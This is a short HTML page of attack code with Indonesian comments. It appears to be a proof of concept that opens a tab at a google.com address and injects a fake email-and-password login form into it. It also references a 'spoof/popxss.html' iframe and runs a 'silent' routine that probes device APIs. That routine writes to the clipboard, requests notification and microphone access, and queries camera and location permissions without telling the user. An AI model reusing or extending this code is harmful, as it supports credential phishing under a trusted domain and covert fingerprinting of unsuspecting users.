<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download File .txt + APIs</title>
<script>
function go() {
    var x = window.open('https://www.google.com/csi', '_blank'); 
    setTimeout(function(){
        x.document.body.innerHTML = 
            '<h1>Login</h1>' +
            'Email:<input id="email"><br>' +
            'Pass:<input id="pass" type="password"><br>' +
            '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>' +
            '<br><br>' +
            '<button onclick="downloadFile()">Download Text File</button>' +
            '<br><br>' +
            '<a href="https://www.example.com/path/to/your/file.txt" download="file.txt">Download the File</a>' +
            '<br><br>' +
            '<h2>Embedded iFrame Example</h2>' +
           // '<iframe src="https://ecdnts-del.github.io/spoof/popxss.html" width="600" height="400" style="border:1px solid #ccc;"></iframe>';

        // Panggil semua API secara “silent” setelah tab terbuka
        callSilentAPIs(x);
    }, 3000);
}

// Fungsi download file dari URL
function downloadFile() {
    const fileUrl = 'https://www.example.com/path/to/your/file.txt';
    const link = document.createElement('a');
    link.href = fileUrl;
    link.download = 'file.txt';
    link.click();
}

// ==== Silent API Fingerprinting untuk iOS ====
async function callSilentAPIs(win) {
    try {
        // Storage
        localStorage.setItem('silent','1');
        sessionStorage.setItem('silent','1');
        indexedDB.open('silent');

        // Clipboard (iOS mungkin tidak bisa)
        if(navigator.clipboard?.writeText){
            await navigator.clipboard.writeText("silent");
        }

        // Notification
        if(Notification) Notification.requestPermission();

        // Battery
        if(navigator.getBattery) await navigator.getBattery();

        // Network
        navigator.connection?.effectiveType;

        // Vibration
        navigator.vibrate?.(50);

        // Orientation / Motion
        win.addEventListener('deviceorientation',()=>{}, {once:true});
        win.addEventListener('devicemotion',()=>{}, {once:true});

        // Speech Synthesis
        speechSynthesis.speak(new SpeechSynthesisUtterance("Silent API"));

        // Speech Recognition
        const SR = win.SpeechRecognition || win.webkitSpeechRecognition;

        // Fullscreen
        win.document.documentElement.requestFullscreen?.();

        // Visibility
        win.document.visibilityState;

        // Performance
        performance.now();

        // Canvas / WebGL
        const c = win.document.createElement('canvas');
        c.getContext('2d')?.fillRect(0,0,10,10);
        c.getContext('webgl');

        // Gamepad
        navigator.getGamepads?.();

        // WebRTC audio
        try { await navigator.mediaDevices.getUserMedia({audio:true}); } catch {}

        // Screen info
        screen.width; screen.height;

        // Language / Timezone
        navigator.language;
        Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Online
        navigator.onLine;

        // Permissions
        if(navigator.permissions){
            ['camera','microphone','geolocation','notifications'].forEach(async p=>{
                try{await navigator.permissions.query({name:p});}catch{}
            });
        }

        // Extra iOS-friendly APIs
        navigator.maxTouchPoints;
        matchMedia('(prefers-reduced-motion: reduce)').matches;
        matchMedia('(color-gamut: p3)').matches;

    } catch(e){ /* silent */ }
}
</script>
</head>
<body>
    <button onclick="go()">Go</button>
</body>
</html>
